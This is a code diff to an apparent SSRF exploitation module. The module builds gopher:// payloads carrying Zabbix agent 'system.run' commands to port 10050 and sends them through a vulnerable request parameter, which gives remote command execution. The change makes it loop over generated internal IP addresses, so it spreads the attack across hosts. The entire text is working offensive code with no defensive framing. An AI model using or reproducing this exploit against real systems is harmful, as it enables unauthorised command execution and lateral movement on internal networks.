@@ -31,16 +31,17 @@ class exploit():
             self.cmd  = cmd
 
         # Data for the service
-        ip   = "127.0.0.1"
-        port = "10050"
-        self.cmd = urllib.quote_plus(self.cmd).replace("+","%20")
-        self.cmd = self.cmd.replace("%2F","/")
-        self.cmd = self.cmd.replace("%25","%")
-        self.cmd = self.cmd.replace("%3A",":")
-        data = "system.run[(" + self.cmd + ");sleep 2s]"
-        
-        payload = wrapper_gopher(data, ip , port)
-        logging.info("Generated payload : {}".format(payload))
+        gen_host = gen_ip_list("127.0.0.1", args.level)
+        for ip in gen_host:
+            port = "10050"
+            self.cmd = urllib.quote_plus(self.cmd).replace("+","%20")
+            self.cmd = self.cmd.replace("%2F","/")
+            self.cmd = self.cmd.replace("%25","%")
+            self.cmd = self.cmd.replace("%3A",":")
+            data = "system.run[(" + self.cmd + ");sleep 2s]"
+            
+            payload = wrapper_gopher(data, ip , port)
+            logging.info("Generated payload : {}".format(payload))
 
-        # Send the payload
-        r = requester.do_request(args.param, payload)
+            # Send the payload
+            r = requester.do_request(args.param, payload)
